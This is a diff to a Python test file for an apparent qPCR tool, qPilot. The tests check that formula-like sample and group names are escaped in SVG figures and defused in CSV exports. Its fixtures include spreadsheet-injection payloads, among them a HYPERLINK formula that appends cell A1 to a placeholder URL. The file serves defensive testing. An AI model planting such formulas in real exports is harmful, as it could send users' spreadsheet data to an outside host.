@@ -33,7 +33,7 @@ from tests.web.conftest import BASE, TOKEN, wait_job
 
 # A sample and a target as qPilot's name rule keeps them (letters, digits, ``_ - . ( )``: a
 # minus first is a formula in a spreadsheet, and "-RT" is how many labs name a no-RT control),
-# and a group named so too (an export refuses other characters in a group's name).
+# and a group named so too (a group may hold any sign: ``test_unicode_names.py``).
 EVIL_SAMPLE = "-KO(2)"
 EVIL_TARGET = "-Mar1"
 EVIL_GROUP = "-HYPERLINK(A1)"
@@ -290,17 +290,12 @@ def test_the_cli_quantities_csv_is_defused(tmp_path):
     _assert_csv_defused("quantities.csv", out.read_text(encoding="utf-8"))
 
 
-# RT-EX-003
-def test_a_group_the_exports_cannot_name_is_said_in_words_not_a_500(tmp_path, monkeypatch):
-    """A group named with a character the exports refuse (``=`` here) gives the figure routes
-    a refusal in words (409), never "something went wrong inside qPilot" (500)."""
+# RT-EX-003, and the follow-up: a group may now be named with any sign
+def _walk_groups(tmp_path, monkeypatch, groups: dict[str, str]):
     from qpilot.ai.client import ModelClient, NoneBackend
     from qpilot.core.store import StudyStore
-    from qpilot.qpcr import design_checks
     from qpilot.qpcr import inspect as qinspect
     from qpilot.studio_service import Studio
-    from qpilot.web.context import make_context
-    from qpilot.web.server import create_app
     from tests.fixtures.studio.studio_mini import write_studio_mini
 
     root = tmp_path / "data"
@@ -311,13 +306,66 @@ def test_a_group_the_exports_cannot_name_is_said_in_words_not_a_500(tmp_path, mo
     rdml = write_studio_mini(root / "mini.rdml")
     store = StudyStore(tmp_path / "studies")
     studio = Studio(store, client=ModelClient(backend=NoneBackend()))
+    _, study = _walk(studio, rdml, groups)
+    return store, studio, study
+
+
+def _figure_client(store, studio):
+    from qpilot.web.context import make_context
+    from qpilot.web.server import create_app
+
+    ctx = make_context(store, studio, token=TOKEN, watch=False)
+    client = TestClient(create_app(ctx), base_url=BASE)
+    client.headers["x-qpilot-token"] = TOKEN
+    return ctx, client
+
+
+def _reset() -> None:
+    from qpilot.qpcr import design_checks
+    from qpilot.qpcr import inspect as qinspect
+
+    design_checks._DECLARED.clear()
+    design_checks.set_input_resolver(None)
+    qinspect.clear_cache()
+
+
+def test_a_formula_like_group_is_drawn_as_text(tmp_path, monkeypatch):
+    """A group named like a formula is drawn (it was a 409 before any sign was allowed): the
+    SVG carries it as escaped text, the figure's CSV defuses it, the file name is plain."""
     bad = '=HYPERLINK("http://x.invalid/?"&A1,"open")'
     groups = {"WT_1": "WT", "WT_2": "WT", "KO_1": bad, "KO_2": bad}
     try:
-        _, study = _walk(studio, rdml, groups)
-        ctx = make_context(store, studio, token=TOKEN, watch=False)
-        with TestClient(create_app(ctx), base_url=BASE) as c:
-            c.headers["x-qpilot-token"] = TOKEN
+        store, studio, study = _walk_groups(tmp_path, monkeypatch, groups)
+        ctx, c = _figure_client(store, studio)
+        with c:
+            info = c.get(f"/api/studies/{study}/report/figure/info", params={"gene": "1-Mar"})
+            assert info.status_code == 200, info.text
+            assert bad in {g["name"] for g in info.json()["groups"]}
+            svg = c.get(f"/api/studies/{study}/report/figure", params={"gene": "1-Mar"})
+            assert svg.status_code == 200, svg.text[:200]
+            root = etree.fromstring(svg.content, etree.XMLParser(resolve_entities=False))
+            assert bad in " ".join(root.itertext())
+            assert not [e for e in root.iter() if etree.QName(e).localname in ("a", "script")]
+            params = {"gene": "1-Mar", "format": "csv", "download": 1}
+            r = c.get(f"/api/studies/{study}/report/figure", params=params)
+            _assert_csv_defused("figure source", r.text)
+            name = r.headers["content-disposition"].split("filename=", 1)[1].strip('"')
+            assert name.isascii() and "/" not in name and '"' not in name
+        ctx.close()
+    finally:
+        _reset()
+
+
+def test_a_group_the_exports_cannot_name_is_said_in_words_not_a_500(tmp_path, monkeypatch):
+    """A group whose name holds a tab (only an agent's proposal can carry one: the page refuses
+    it) gives the figure routes a refusal in words (409), never "something went wrong inside
+    qPilot" (500)."""
+    bad = "KO\tHYPERLINK"
+    groups = {"WT_1": "WT", "WT_2": "WT", "KO_1": bad, "KO_2": bad}
+    try:
+        store, studio, study = _walk_groups(tmp_path, monkeypatch, groups)
+        ctx, c = _figure_client(store, studio)
+        with c:
             for route in ("report/figure/info", "report/figure"):
                 r = c.get(f"/api/studies/{study}/{route}", params={"gene": "1-Mar"})
                 assert r.status_code == 409, (route, r.status_code, r.text[:200])
@@ -325,6 +373,4 @@ def test_a_group_the_exports_cannot_name_is_said_in_words_not_a_500(tmp_path, mo
                 assert "HYPERLINK" not in r.text  # the name is not echoed
         ctx.close()
     finally:
-        design_checks._DECLARED.clear()
-        design_checks.set_input_resolver(None)
-        qinspect.clear_cache()
+        _reset()
